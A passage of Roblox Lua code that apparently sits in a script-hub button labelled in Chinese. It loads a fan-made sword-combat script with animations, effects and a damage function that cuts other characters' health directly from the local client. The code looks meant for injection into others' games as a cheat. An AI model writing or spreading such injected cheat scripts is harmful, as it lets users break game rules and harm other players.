local a,b = Triangle((scfr*CFrame.new(0,h/2,0)).p,(scfr*CFrame.new(0,-h/2,0)).p,(blcf*CFrame.new(0,h/2,0)).p)
if a then game.Debris:AddItem(a,1) end if b then game.Debris:AddItem(b,1) end
local a,b = Triangle((blcf*CFrame.new(0,h/2,0)).p,(blcf*CFrame.new(0,-h/2,0)).p,(scfr*CFrame.new(0,-h/2,0)).p)
if a then game.Debris:AddItem(a,1) end if b then game.Debris:AddItem(b,1) end
scfr = blcf
elseif not scfr then
scfr = blcf
end
RootJoint.C0 = clerp(RootJoint.C0,RootCF*cf(0,0,0)* angles(math.rad(0),math.rad(0),math.rad(-90)),.2)
Torso.Neck.C0 = clerp(Torso.Neck.C0,necko *angles(math.rad(5),math.rad(0),math.rad(60)),.2)
RW.C0=clerp(RW.C0,cf(1.5,0.5,0)*euler(math.rad(0),math.rad(-20),math.rad(70)),.2)
LW.C0 = clerp(LW.C0, CFrame.new(-1.5, 0.5, 0) * angles(math.rad(0), math.rad(0), math.rad(-40)), 0.2)
RH.C0=clerp(RH.C0,cf(1,-1,0)*angles(math.rad(0),math.rad(90),math.rad(-10)),.2)
LH.C0=clerp(LH.C0,cf(-1,-1,0)*angles(math.rad(0),math.rad(-90),math.rad(0)),.2)
Handleweld.C0=clerp(Handleweld.C0,cf(0,-0,.4)*angles(math.rad(0),math.rad(10),math.rad(0)),.2)
end
attack=false
con1:disconnect()
scfr = nil
pcall(function()
        hitconasdf:disconnect()
        end)
end

mouse.Button1Down:connect(function()
        if attack==false then
                if attacktype==1 then
                        attack=true
                        attacktype=2
                        attackone()
                elseif attacktype==2 then
                        attack=true
                        attacktype=3
                        attacktwo()
               elseif attacktype==3 then
                        attack=true
                        attacktype=1
                        attackthree()
                end
        end
end)

mouse.KeyDown:connect(function(k)
	k=k:lower()
	if k=='q' then
		if attack==false then
			CyanMoon()
		end
	elseif k=='e' then
		if attack==false then
			Execution()
		end
	end
end)


local sine = 0
local change = 1
local val = 0

while true do
swait()
sine = sine + change
local torvel=(RootPart.Velocity*Vector3.new(1,0,1)).magnitude 
local velderp=RootPart.Velocity.y
hitfloor,posfloor=rayCast(RootPart.Position,(CFrame.new(RootPart.Position,RootPart.Position - Vector3.new(0,1,0))).lookVector,4,Character)
if equipped==true or equipped==false then
if attack==false then
idle=idle+1
else
idle=0
end
if idle>=500 then
if attack==false then
--Sheath()
end
end
if RootPart.Velocity.y > 1 and hitfloor==nil then 
Anim="Jump"
if attack==false then
RootJoint.C0 = clerp(RootJoint.C0,RootCF*cf(0,0,0)* angles(math.rad(-5),math.rad(0),math.rad(0)),.3)
Torso.Neck.C0 = clerp(Torso.Neck.C0,necko *angles(math.rad(-10),math.rad(0),math.rad(0)),.3)
RW.C0 = clerp(RW.C0, CFrame.new(1.5, 0.5, 0) * angles(math.rad(30), math.rad(0), math.rad(10)), 0.3)
LW.C0 = clerp(LW.C0, CFrame.new(-1.5, 0.5, 0) * angles(math.rad(-20), math.rad(0), math.rad(-30)), 0.3)
RH.C0=clerp(RH.C0,cf(1,-1,0)*angles(math.rad(0),math.rad(90),math.rad(-20)),.3)
LH.C0=clerp(LH.C0,cf(-1,-1,0)*angles(math.rad(0),math.rad(-60),math.rad(0)),.3)
Handleweld.C0=clerp(Handleweld.C0,cf(0,-0,.4)*angles(math.rad(85),math.rad(10),math.rad(0)),.3)
end
elseif RootPart.Velocity.y < -1 and hitfloor==nil then 
Anim="Fall"
if attack==false then
RootJoint.C0 = clerp(RootJoint.C0,RootCF*cf(0,0,0)* angles(math.rad(5),math.rad(0),math.rad(0)),.3)
Torso.Neck.C0 = clerp(Torso.Neck.C0,necko *angles(math.rad(10),math.rad(0),math.rad(0)),.3)
RW.C0 = clerp(RW.C0, CFrame.new(1.5, 0.5, 0) * angles(math.rad(30), math.rad(0), math.rad(20)), 0.3)
LW.C0 = clerp(LW.C0, CFrame.new(-1.5, 0.5, 0) * angles(math.rad(-20), math.rad(0), math.rad(-40)), 0.3)
RH.C0=clerp(RH.C0,cf(1,-1,0)*angles(math.rad(0),math.rad(90),math.rad(-20)),.3)
LH.C0=clerp(LH.C0,cf(-1,-1,0)*angles(math.rad(0),math.rad(-60),math.rad(0)),.3)
Handleweld.C0=clerp(Handleweld.C0,cf(0,-0,.4)*angles(math.rad(85),math.rad(10),math.rad(0)),.3)
end
elseif torvel<1 and hitfloor~=nil then
Anim="Idle"
if attack==false then
RootJoint.C0 = clerp(RootJoint.C0,RootCF*cf(0,0,0)* angles(math.rad(10),math.rad(0),math.rad(60)),.3)
Torso.Neck.C0 = clerp(Torso.Neck.C0,necko *angles(math.rad(-5),math.rad(5),math.rad(-50)),.3)
RW.C0 = clerp(RW.C0, CFrame.new(1.5, 0.5, 0) * angles(math.rad(70), math.rad(100), math.rad(0)), 0.3)
LW.C0 = clerp(LW.C0, CFrame.new(-1.5, 0.5, 0) * angles(math.rad(50), math.rad(-70), math.rad(0)), 0.3)
RH.C0=clerp(RH.C0,cf(1,-1,0.2)*angles(math.rad(0),math.rad(40),math.rad(20)),.3)
LH.C0=clerp(LH.C0,cf(-1,-1,0)*angles(math.rad(0),math.rad(-60),math.rad(0)),.3)
Handleweld.C0=clerp(Handleweld.C0,cf(0,0,0)*angles(math.rad(0),math.rad(-5),math.rad(0)),.3)
end
elseif torvel>2 and hitfloor~=nil then
Anim="Walk"
if attack==false then
change=3
RootJoint.C0 = clerp(RootJoint.C0,RootCF*cf(0,0,0)* angles(math.rad(20),math.rad(0),math.rad(60)),.3)
Torso.Neck.C0 = clerp(Torso.Neck.C0,necko *angles(math.rad(-10),math.rad(10),math.rad(-50)),.3)
RW.C0 = clerp(RW.C0, CFrame.new(1.5, 0.5, 0) * angles(math.rad(70), math.rad(100), math.rad(0)), 0.3)
LW.C0 = clerp(LW.C0, CFrame.new(-1.5, 0.5, 0) * angles(math.rad(50), math.rad(-70), math.rad(0)), 0.3)
RH.C0=clerp(RH.C0,cf(1,-1,0)*angles(math.rad(0),math.rad(80),math.rad(20)),.3)
LH.C0=clerp(LH.C0,cf(-1,-1,0)*angles(math.rad(0),math.rad(-100),math.rad(0)),.3)
Handleweld.C0=clerp(Handleweld.C0,cf(0,0,0)*angles(math.rad(0),math.rad(-5),math.rad(0)),.3)
end
end
end
if #Effects>0 then
for e=1,#Effects do
if Effects[e]~=nil then
local Thing=Effects[e]
if Thing~=nil then
local Part=Thing[1]
local Mode=Thing[2]
local Delay=Thing[3]
local IncX=Thing[4]
local IncY=Thing[5]
local IncZ=Thing[6]
if Thing[1].Transparency<=1 then
if Thing[2]=="Block1" then
Thing[1].CFrame=Thing[1].CFrame*euler(math.random(-50,50),math.random(-50,50),math.random(-50,50))
Mesh=Thing[1].Mesh
Mesh.Scale=Mesh.Scale+vt(Thing[4],Thing[5],Thing[6])
Thing[1].Transparency=Thing[1].Transparency+Thing[3]
elseif Thing[2]=="Cylinder" then
Mesh=Thing[1].Mesh
Mesh.Scale=Mesh.Scale+vt(Thing[4],Thing[5],Thing[6])
Thing[1].Transparency=Thing[1].Transparency+Thing[3]
elseif Thing[2]=="Blood" then
Mesh=Thing[7]
Thing[1].CFrame=Thing[1].CFrame*cf(0,.5,0)
Mesh.Scale=Mesh.Scale+vt(Thing[4],Thing[5],Thing[6])
Thing[1].Transparency=Thing[1].Transparency+Thing[3]
elseif Thing[2]=="Elec" then
Mesh=Thing[1].Mesh
Mesh.Scale=Mesh.Scale+vt(Thing[7],Thing[8],Thing[9])
Thing[1].Transparency=Thing[1].Transparency+Thing[3]
elseif Thing[2]=="Disappear" then
Thing[1].Transparency=Thing[1].Transparency+Thing[3]
end
else
Part.Parent=nil
table.remove(Effects,e)
end
end
end
end
end
end

  	end    

})

Tab:AddButton({

	Name = "万剑归宗（部分游戏）",

	Callback = function()

     --[[Modified by Citrus for Majora]]--

-- New Q move (When charge reaches 100)
-- New idle stance, swords don't float so stiffly

--[[Config]]

trails = false --Added an option to turn the trail effects on/off since they may lag.

--//////////

local hitsounds = {"199149137","199149186","199149221","199149235","199149269","199149297"}

--//////////

--[[THEKORBLOXCORE_WEAPONRY]]--
Player = game.Players.LocalPlayer
Cha = Player.Character
---------------------------------------Taunts n Stuff
local Taunts = {"Oh really?" , "I pity you" , "Sigh.." , "Prepare to be Reaped" , "I am only one Reaper", "This is a Fantasy" , "Lovely, My Swords Appear!" , "You should be able to kill me"}
local Attacks = {"Insolence!" , "Weak!" , "Take this!" , "Fool!" , "Come, Open your Heart" , ">Game Quote Here<" , "Fallen Angel!" , "Descend, Heartless Angel" }
local Summon = {"Submit!!" , "Summon!" , "Come Guardian!!" , ">Summon Quote Here<"}
---------------------------------------Chat Gui n stuff
function Chat(Object,Text,Color)
local Color = BrickColor.new(Color)
pcall(function()Object:findFirstChild("AtlasText"):Destroy()end)
local G = Instance.new("BillboardGui",Object)
G.Name = "AtlasText"
G.Adornee = Object
G.Size = UDim2.new(3.5,0,2.5,0)
G.AlwaysOnTop = false
G.StudsOffset = Vector3.new(0,3,0)
local Frame = Instance.new("Frame")
Frame.Parent = G
Frame.Size = UDim2.new(1,0,1,0)
Frame.BackgroundTransparency = 1
local Txt = Instance.new("TextLabel",Frame)
Txt.Size = UDim2.new(1,0,1,0)
Txt.Text = Text
Txt.TextScaled = true
Txt.TextWrapped = true
Txt.Font = "SourceSansBold"
Txt.TextColor = Color
Txt.BackgroundTransparency = 1
Txt.ZIndex = 2
Game:GetService("Debris"):AddItem(G,3)
end
Chat(Cha.Head,Taunts[math.random(1,#Taunts)],"Really black")
----------------
function rand(a)return (math.random()-.5)*2*a end
function q(f,arg)return coroutine.resume(coroutine.create(f),unpack(arg or {}))end
function fade(p,s,inc)q(function(part,start,increment)increment = increment or .05 for i=start,1,increment do part.Transparency = part.Transparency+increment wait(1/30)end end,{p,s,inc})end
function appear(p,s,inc)q(function(part,start,increment)increment = increment or .05 for i=start,0,-increment do part.Transparency = part.Transparency-increment wait(1/30)end end,{p,s,inc})end
function Part2(Name,Parent,Size,CFrame,Color,Trans,Anch,Can,Mat,Ref)
        local p = Instance.new("Part",Parent)
        p.Name = Name
        p.FormFactor = "Custom"p.Size = Size
        p.Anchored = Anch p.CFrame = CFrame
        p.BrickColor = BrickColor.new(Color)p.Transparency = Trans
        p.TopSurface = 0 p.CanCollide = Can
        p.BottomSurface = 0 p.Material = Mat
        p.Reflectance = Ref or 0;p:BreakJoints()
        p.Locked = true;return p
end
function WedgePart(Name,Parent,Size,CFrame,Color,Trans,Anch,Can,Mat,Ref)
        local p = Instance.new("WedgePart",Parent)p.Name = Name
        p.FormFactor = "Custom"p.Size = Size
        p.Anchored = Anch p.CFrame = CFrame
        p.BrickColor = BrickColor.new(Color)p.Transparency = Trans
        p.TopSurface = 0 p.CanCollide = Can
        p.BottomSurface = 0 p.Material = Mat
        p.Reflectance = Ref or 0;p:BreakJoints()
        p.Locked = true;return p
end
function CornerWedgePart(Name,Parent,Size,CFrame,Color,Trans,Anch,Can,Mat,Ref)
        local p = Instance.new("CornerWedgePart",Parent)p.Name = Name;p.Size = Size
        p.Anchored = Anch p.CFrame = CFrame
        p.BrickColor = BrickColor.new(Color)p.Transparency = Trans
        p.TopSurface = 0 p.CanCollide = Can
        p.BottomSurface = 0 p.Material = Mat
        p.Reflectance = Ref or 0;p:BreakJoints()
        p.Locked = true;return p
end
function Mesh(Parent,Type,Scale,ID,TID)
        local m = Instance.new("SpecialMesh",Parent)m.MeshType = Type
        m.Scale = Scale or Vector3.new(1,1,1)
        if ID then m.MeshId = ID end if TID then m.TextureId = TID end
        return m
end
function Weld(p1,p2,c0,c1)
        local w = Instance.new("Weld",p1)w.Part0 = p1;w.Part1 = p2
        w.C0,w.C1 = c0 or CFrame.new(),c1 or CFrame.new()
        return w
end
function cslerp(start,destination,increment)
        local function s(a,b,c)return (1-c)*a+(c*b)end
        local c1 = {start.X,start.Y,start.Z,start:toEulerAnglesXYZ()}
        local c2 = {destination.X,destination.Y,destination.Z,destination:toEulerAnglesXYZ()}
        for i,v in pairs(c1)do c1[i] = s(v,c2[i],increment)end
        return CFrame.new(c1[1],c1[2],c1[3])*CFrame.Angles(c1[4],c1[5],c1[6])
end
local char
function rayCast(pos,dir,collidedlist,startpos,endpos,distleft)
        collidedlist = collidedlist
        startpos = startpos or pos
        distleft = distleft or dir.unit * dir.magnitude
        endpos = endpos or pos + distleft
        local ray = Ray.new(pos,distleft)
        local hitz,enz = workspace:FindPartOnRayWithIgnoreList(ray,collidedlist)
        if hitz~=nil then
                if hitz.CanCollide==false then
                        table.insert(collidedlist,hitz)
                        local newpos = enz
                        local newdistleft = distleft-(dir.unit*(pos-newpos).magnitude)
                        if newdistleft~=Vector3.new()then
                                return rayCast(newpos-(dir*0.01),dir,collidedlist,startpos,endpos,newdistleft+(dir*0.01))
                        end
                end
        end
        return hitz,enz,ray
end
function findSurface(part,position)
        local obj = part.CFrame:pointToObjectSpace(position)
        local siz = part.Size/2
        for i,v in pairs(Enum.NormalId:GetEnumItems()) do
                local vec = Vector3.FromNormalId(v)
                local wvec = part.CFrame:vectorToWorldSpace(vec)
                local vz = (obj)/(siz*vec)
                if (math.abs(vz.X-1)<0.01 or math.abs(vz.Y-1)<0.01 or math.abs(vz.Z-1)<0.01) then
                        return wvec,vec
                end
        end
end
----------------

Player=game:GetService("Players").LocalPlayer
Character=Player.Character 
PlayerGui=Player.PlayerGui
Backpack=Player.Backpack 
Torso=Character.Torso 
Head=Character.Head 
Humanoid=Character.Humanoid
cam=game.Workspace.CurrentCamera
m=Instance.new('Model',Character)
LeftArm=Character["Left Arm"] 
LeftLeg=Character["Left Leg"] 
RightArm=Character["Right Arm"] 
RightLeg=Character["Right Leg"] 
LS=Torso["Left Shoulder"] 
LH=Torso["Left Hip"] 
RS=Torso["Right Shoulder"] 
RH=Torso["Right Hip"] 
Face = Head.face
Neck=Torso.Neck
it=Instance.new
attacktype=1
vt=Vector3.new
cf=CFrame.new
euler=CFrame.fromEulerAnglesXYZ
angles=CFrame.Angles
cloaked=false
necko=cf(0, 1, 0, -1, -0, -0, 0, 0, 1, 0, 1, 0)
necko2=cf(0, -0.5, 0, -1, -0, -0, 0, 0, 1, 0, 1, 0)
LHC0=cf(-1,-1,0,-0,-0,-1,0,1,0,1,0,0)
LHC1=cf(-0.5,1,0,-0,-0,-1,0,1,0,1,0,0)
RHC0=cf(1,-1,0,0,0,1,0,1,0,-1,-0,-0)
RHC1=cf(0.5,1,0,0,0,1,0,1,0,-1,-0,-0)
RootPart=Character.HumanoidRootPart
RootJoint=RootPart.RootJoint
RootCF=euler(-1.57,0,3.14)
attack = false 
attackdebounce = false 
deb=false
equipped=true
hand=false
MMouse=nil
combo=0
mana=0
trispeed=.2
attackmode='none'
local idle=0
local Anim="Idle"
local Effects={}
local gun=false
local shoot=false
player=nil 
mana=0
Attacking=false
asset = "http://www.roblox.com/asset/?id="
meshes = {["blast"] = 20329976,["ring"] = 3270017,["spike"] = 1033714,["cone"] = 1082802,["crown"] = 20329976,["cloud"] = 1095708,["diamond"] = 9756362}
sounds = {["explode"] = 130792180;}
torsomesh = "rbxasset://fonts/torso.mesh"
colours = {"Tr. Red","Black","Tr. Blue","Black","Phosph. White","Royal purple"}
local ASpeed = 10
Humanoid.MaxHealth = 500
wait()
Humanoid.Health=500

mouse=Player:GetMouse()
--save shoulders 
--RSH, LSH=nil, nil 
--welds 
RW, LW=Instance.new("Weld"), Instance.new("Weld") 
RW.Name="Right Shoulder" LW.Name="Left Shoulder"
LH=Torso["Left Hip"]
RH=Torso["Right Hip"]
TorsoColor=Torso.BrickColor
function NoOutline(Part)
Part.TopSurface,Part.BottomSurface,Part.LeftSurface,Part.RightSurface,Part.FrontSurface,Part.BackSurface = 10,10,10,10,10,10
end
player=Player 
ch=Character
RSH=ch.Torso["Right Shoulder"] 
LSH=ch.Torso["Left Shoulder"] 
-- 
--RSH.Parent=nil 
--wLSH.Parent=nil 
-- 
RW.Name="Right Shoulder"
RW.Part0=ch.Torso 
RW.C0=cf(1.5, 0.5, 0) --* CFrame.fromEulerAnglesXYZ(1.3, 0, -0.5) 
RW.C1=cf(0, 0.5, 0) 
RW.Part1=ch["Right Arm"] 
RW.Parent=ch.Torso 
-- 
LW.Name="Left Shoulder"
LW.Part0=ch.Torso 
LW.C0=cf(-1.5, 0.5, 0) --* CFrame.fromEulerAnglesXYZ(1.7, 0, 0.8) 
LW.C1=cf(0, 0.5, 0) 
LW.Part1=ch["Left Arm"] 
LW.Parent=ch.Torso 

        Player=game:GetService('Players').LocalPlayer
        Character=Player.Character
        Mouse=Player:GetMouse()
        m=Instance.new('Model',Character)


        local function weldBetween(a, b)
            local weldd = Instance.new("ManualWeld")
            weldd.Part0 = a
            weldd.Part1 = b
            weldd.C0 = CFrame.new()
            weldd.C1 = b.CFrame:inverse() * a.CFrame
            weldd.Parent = a
            return weldd
        end
        
        it=Instance.new
        
        function nooutline(part)
                part.TopSurface,part.BottomSurface,part.LeftSurface,part.RightSurface,part.FrontSurface,part.BackSurface = 10,10,10,10,10,10
        end
        
        function part(formfactor,parent,material,reflectance,transparency,brickcolor,name,size)
                local fp=it("Part")
                fp.formFactor=formfactor
                fp.Parent=parent
                fp.Reflectance=reflectance
                fp.Transparency=transparency
                fp.CanCollide=false
                fp.Locked=true
                fp.BrickColor=BrickColor.new(tostring(brickcolor))
                fp.Name=name
                fp.Size=size
                fp.Position=Character.Torso.Position
                nooutline(fp)
                fp.Material=material
                fp:BreakJoints()
                return fp
        end
        
        function mesh(Mesh,part,meshtype,meshid,offset,scale)
                local mesh=it(Mesh)
                mesh.Parent=part
                if Mesh=="SpecialMesh" then
                        mesh.MeshType=meshtype
                        mesh.MeshId=meshid
                end
                mesh.Offset=offset
                mesh.Scale=scale
                return mesh
        end
        
        function weld(parent,part0,part1,c0,c1)
                local weld=it("Weld")
                weld.Parent=parent
                weld.Part0=part0
                weld.Part1=part1
                weld.C0=c0
                weld.C1=c1
                return weld
        end    


    Player=game:GetService('Players').LocalPlayer
        Character=Player.Character
        Mouse=Player:GetMouse()
        m=Instance.new('Model',Character)


        local function weldBetween(a, b)
            local weldd = Instance.new("ManualWeld")
            weldd.Part0 = a
            weldd.Part1 = b
            weldd.C0 = CFrame.new()
            weldd.C1 = b.CFrame:inverse() * a.CFrame
            weldd.Parent = a
            return weldd
        end
        
        it=Instance.new
        
        function nooutline(part)
                part.TopSurface,part.BottomSurface,part.LeftSurface,part.RightSurface,part.FrontSurface,part.BackSurface = 10,10,10,10,10,10
        end
        
        function part(formfactor,parent,material,reflectance,transparency,brickcolor,name,size)
                local fp=it("Part")
                fp.formFactor=formfactor
                fp.Parent=parent
                fp.Reflectance=reflectance
                fp.Transparency=transparency
                fp.CanCollide=false
                fp.Locked=true
                fp.BrickColor=BrickColor.new(tostring(brickcolor))
                fp.Name=name
                fp.Size=size
                fp.Position=Character.Torso.Position
                nooutline(fp)
                fp.Material=material
                fp:BreakJoints()
                return fp
        end
        
        function swait(num)
    if num==0 or num==nil then
    game:service'RunService'.Stepped:wait(0)
    else
    for i=0,num do
    game:service'RunService'.Stepped:wait(0)
    end
    end
    end
        
        function mesh(Mesh,part,meshtype,meshid,offset,scale)
                local mesh=it(Mesh)
                mesh.Parent=part
                if Mesh=="SpecialMesh" then
                        mesh.MeshType=meshtype
                        mesh.MeshId=meshid
                end
                mesh.Offset=offset
                mesh.Scale=scale
                return mesh
        end
        
        function weld(parent,part0,part1,c0,c1)
                local weld=it("Weld")
                weld.Parent=parent
                weld.Part0=part0
                weld.Part1=part1
                weld.C0=c0
                weld.C1=c1
                return weld
        end
        
        
local function CFrameFromTopBack(at, top, back)
local right = top:Cross(back)
return CFrame.new(at.x, at.y, at.z,
right.x, top.x, back.x,
right.y, top.y, back.y,
right.z, top.z, back.z)
end

function Triangle(a, b, c)
local edg1 = (c-a):Dot((b-a).unit)
local edg2 = (a-b):Dot((c-b).unit)
local edg3 = (b-c):Dot((a-c).unit)
if edg1 <= (b-a).magnitude and edg1 >= 0 then
a, b, c = a, b, c
elseif edg2 <= (c-b).magnitude and edg2 >= 0 then
a, b, c = b, c, a
elseif edg3 <= (a-c).magnitude and edg3 >= 0 then
a, b, c = c, a, b
else
assert(false, "unreachable")
end
 
local len1 = (c-a):Dot((b-a).unit)
local len2 = (b-a).magnitude - len1
local width = (a + (b-a).unit*len1 - c).magnitude
 
local maincf = CFrameFromTopBack(a, (b-a):Cross(c-b).unit, -(b-a).unit)
 
local list = {}

local Color = BrickColor.new("Really black")
 
if len1 > 0.01 then
local w1 = Instance.new('WedgePart', m)
game:GetService("Debris"):AddItem(w1,5)
w1.Material = "SmoothPlastic"
w1.FormFactor = 'Custom'
w1.BrickColor = Color
w1.Transparency = 0
w1.Reflectance = 0
w1.Material = "SmoothPlastic"
w1.CanCollide = false
NoOutline(w1)
local sz = Vector3.new(0.2, width, len1)
w1.Size = sz
local sp = Instance.new("SpecialMesh",w1)
sp.MeshType = "Wedge"
sp.Scale = Vector3.new(0,1,1) * sz/w1.Size
w1:BreakJoints()
w1.Anchored = true
w1.Parent = workspace
w1.Transparency = 0.7
table.insert(Effects,{w1,"Disappear",.01})
w1.CFrame = maincf*CFrame.Angles(math.pi,0,math.pi/2)*CFrame.new(0,width/2,len1/2)
table.insert(list,w1)
end
 
if len2 > 0.01 then
local w2 = Instance.new('WedgePart', m)
game:GetService("Debris"):AddItem(w2,5)
w2.Material = "SmoothPlastic"
w2.FormFactor = 'Custom'
w2.BrickColor = Color
w2.Transparency = 0
w2.Reflectance = 0
w2.Material = "SmoothPlastic"
w2.CanCollide = false
NoOutline(w2)
local sz = Vector3.new(0.2, width, len2)
w2.Size = sz
local sp = Instance.new("SpecialMesh",w2)
sp.MeshType = "Wedge"
sp.Scale = Vector3.new(0,1,1) * sz/w2.Size
w2:BreakJoints()
w2.Anchored = true
w2.Parent = workspace
w2.Transparency = 0.7
table.insert(Effects,{w2,"Disappear",.01})
w2.CFrame = maincf*CFrame.Angles(math.pi,math.pi,-math.pi/2)*CFrame.new(0,width/2,-len1 - len2/2)
table.insert(list,w2)
end
return unpack(list)
end
        
        
so = function(id,par,vol,pit) 
coroutine.resume(coroutine.create(function()
local sou = Instance.new("Sound",par or workspace)
sou.Volume=vol
sou.Pitch=pit or 1
sou.SoundId=id
swait() 
sou:play() 
game:GetService("Debris"):AddItem(sou,6)
end))
end
 
function clerp(a,b,t) 
local qa = {QuaternionFromCFrame(a)}
local qb = {QuaternionFromCFrame(b)} 
local ax, ay, az = a.x, a.y, a.z 
local bx, by, bz = b.x, b.y, b.z
local _t = 1-t
return QuaternionToCFrame(_t*ax + t*bx, _t*ay + t*by, _t*az + t*bz,QuaternionSlerp(qa, qb, t)) 
end 
 
function QuaternionFromCFrame(cf) 
local mx, my, mz, m00, m01, m02, m10, m11, m12, m20, m21, m22 = cf:components() 
local trace = m00 + m11 + m22 
if trace > 0 then 
local s = math.sqrt(1 + trace) 
local recip = 0.5/s 
return (m21-m12)*recip, (m02-m20)*recip, (m10-m01)*recip, s*0.5 
else 
local i = 0 
if m11 > m00 then
i = 1
end
if m22 > (i == 0 and m00 or m11) then 
i = 2 
end 
if i == 0 then 
local s = math.sqrt(m00-m11-m22+1) 
local recip = 0.5/s 
return 0.5*s, (m10+m01)*recip, (m20+m02)*recip, (m21-m12)*recip 
elseif i == 1 then 
local s = math.sqrt(m11-m22-m00+1) 
local recip = 0.5/s 
return (m01+m10)*recip, 0.5*s, (m21+m12)*recip, (m02-m20)*recip 
elseif i == 2 then 
local s = math.sqrt(m22-m00-m11+1) 
local recip = 0.5/s return (m02+m20)*recip, (m12+m21)*recip, 0.5*s, (m10-m01)*recip 
end 
end 
end
 
function QuaternionToCFrame(px, py, pz, x, y, z, w) 
local xs, ys, zs = x + x, y + y, z + z 
local wx, wy, wz = w*xs, w*ys, w*zs 
local xx = x*xs 
local xy = x*ys 
local xz = x*zs 
local yy = y*ys 
local yz = y*zs 
local zz = z*zs 
return CFrame.new(px, py, pz,1-(yy+zz), xy - wz, xz + wy,xy + wz, 1-(xx+zz), yz - wx, xz - wy, yz + wx, 1-(xx+yy)) 
end
 
function QuaternionSlerp(a, b, t) 
local cosTheta = a[1]*b[1] + a[2]*b[2] + a[3]*b[3] + a[4]*b[4] 
local startInterp, finishInterp; 
if cosTheta >= 0.0001 then 
if (1 - cosTheta) > 0.0001 then 
local theta = math.acos(cosTheta) 
local invSinTheta = 1/math.sin(theta) 
startInterp = math.sin((1-t)*theta)*invSinTheta 
finishInterp = math.sin(t*theta)*invSinTheta  
else 
startInterp = 1-t 
finishInterp = t 
end 
else 
if (1+cosTheta) > 0.0001 then 
local theta = math.acos(-cosTheta) 
local invSinTheta = 1/math.sin(theta) 
startInterp = math.sin((t-1)*theta)*invSinTheta 
finishInterp = math.sin(t*theta)*invSinTheta 
else 
startInterp = t-1 
finishInterp = t 
end 
end 
return a[1]*startInterp + b[1]*finishInterp, a[2]*startInterp + b[2]*finishInterp, a[3]*startInterp + b[3]*finishInterp, a[4]*startInterp + b[4]*finishInterp 
end

function rayCast(Pos, Dir, Max, Ignore)  -- Origin Position , Direction, MaxDistance , IgnoreDescendants
return game:service("Workspace"):FindPartOnRay(Ray.new(Pos, Dir.unit * (Max or 999.999)), Ignore) 
end 

local function CFrameFromTopBack(at, top, back)
local right = top:Cross(back)
return CFrame.new(at.x, at.y, at.z,
right.x, top.x, back.x,
right.y, top.y, back.y,
right.z, top.z, back.z)
end

function Triangle(a, b, c)
local edg1 = (c-a):Dot((b-a).unit)
local edg2 = (a-b):Dot((c-b).unit)
local edg3 = (b-c):Dot((a-c).unit)
if edg1 <= (b-a).magnitude and edg1 >= 0 then
a, b, c = a, b, c
elseif edg2 <= (c-b).magnitude and edg2 >= 0 then
a, b, c = b, c, a
elseif edg3 <= (a-c).magnitude and edg3 >= 0 then
a, b, c = c, a, b
else
assert(false, "unreachable")
end
 
local len1 = (c-a):Dot((b-a).unit)
local len2 = (b-a).magnitude - len1
local width = (a + (b-a).unit*len1 - c).magnitude
 
local maincf = CFrameFromTopBack(a, (b-a):Cross(c-b).unit, -(b-a).unit)
 
local list = {}
 
if len1 > 0.01 then
local w1 = Instance.new('WedgePart', m)
game:GetService("Debris"):AddItem(w1,5)
w1.Material = "SmoothPlastic"
w1.FormFactor = 'Custom'
w1.BrickColor = BrickColor.new("Really black")
w1.Transparency = 0
w1.Reflectance = 0
w1.Material = "SmoothPlastic"
w1.CanCollide = false
NoOutline(w1)
local sz = Vector3.new(0.2, width, len1)
w1.Size = sz
local sp = Instance.new("SpecialMesh",w1)
sp.MeshType = "Wedge"
sp.Scale = Vector3.new(0,1,1) * sz/w1.Size
w1:BreakJoints()
w1.Anchored = true
w1.Parent = workspace
w1.Transparency = 0.7
table.insert(Effects,{w1,"Disappear",.01})
w1.CFrame = maincf*CFrame.Angles(math.pi,0,math.pi/2)*CFrame.new(0,width/2,len1/2)
table.insert(list,w1)
end
 
if len2 > 0.01 then
local w2 = Instance.new('WedgePart', m)
game:GetService("Debris"):AddItem(w2,5)
w2.Material = "SmoothPlastic"
w2.FormFactor = 'Custom'
w2.BrickColor = BrickColor.new("Really black")
w2.Transparency = 0
w2.Reflectance = 0
w2.Material = "SmoothPlastic"
w2.CanCollide = false
NoOutline(w2)
local sz = Vector3.new(0.2, width, len2)
w2.Size = sz
local sp = Instance.new("SpecialMesh",w2)
sp.MeshType = "Wedge"
sp.Scale = Vector3.new(0,1,1) * sz/w2.Size
w2:BreakJoints()
w2.Anchored = true
w2.Parent = workspace
w2.Transparency = 0.7
table.insert(Effects,{w2,"Disappear",.01})
w2.CFrame = maincf*CFrame.Angles(math.pi,math.pi,-math.pi/2)*CFrame.new(0,width/2,-len1 - len2/2)
table.insert(list,w2)
end
return unpack(list)
end


Damagefunc=function(hit,minim,maxim,knockback,Type,Property,Delay,KnockbackType,decreaseblock)
        if hit.Parent==nil then
                return
        end
        h=hit.Parent:FindFirstChild("Humanoid")
        for _,v in pairs(hit.Parent:children()) do
        if v:IsA("Humanoid") then
        h=v
        end
        end
        if hit.Parent.Parent:FindFirstChild("Torso")~=nil then
        h=hit.Parent.Parent:FindFirstChild("Humanoid")
        end
        if hit.Parent.className=="Hat" then
        hit=hit.Parent.Parent:findFirstChild("Head")
        end
        if h~=nil and hit.Parent.Name~=Character.Name and hit.Parent:FindFirstChild("Torso")~=nil then
        if hit.Parent:findFirstChild("DebounceHit")~=nil then if hit.Parent.DebounceHit.Value==true then return end end
        --[[                if game.Players:GetPlayerFromCharacter(hit.Parent)~=nil then
                        return
                end]]
--                        hs(hit,1.2) 
                        c=Instance.new("ObjectValue")
                        c.Name="creator"
                        c.Value=game:service("Players").LocalPlayer
                        c.Parent=h
                        game:GetService("Debris"):AddItem(c,.5)
                Damage=math.random(minim,maxim)
--                h:TakeDamage(Damage)
                blocked=false
                block=hit.Parent:findFirstChild("Block")
                if block~=nil then
                print(block.className)
                if block.className=="NumberValue" then
                if block.Value>0 then
                blocked=true
                if decreaseblock==nil then
                block.Value=block.Value-1
                end
                end
                end
                if block.className=="IntValue" then
                if block.Value>0 then
                blocked=true
                if decreaseblock~=nil then
                block.Value=block.Value-1
                end
                end
                end
                end
                if blocked==false then
--                h:TakeDamage(Damage)
				so("http://www.roblox.com/asset/?id="..hitsounds[math.random(1,#hitsounds)],game.Players.LocalPlayer.Character.Torso,1,1)
                h.Health=h.Health-Damage
                --showDamage(hit.Parent,Damage,.5,BrickColor.new("Navy blue"))
				ShowDamage2((hit.Parent:FindFirstChild("Head").CFrame * CFrame.new(0, 0, (Head.Size.Z / 2)).p + Vector3.new(0, 1.5, 0)), -Damage, 1.5, BrickColor.new("Really black").Color)
                else
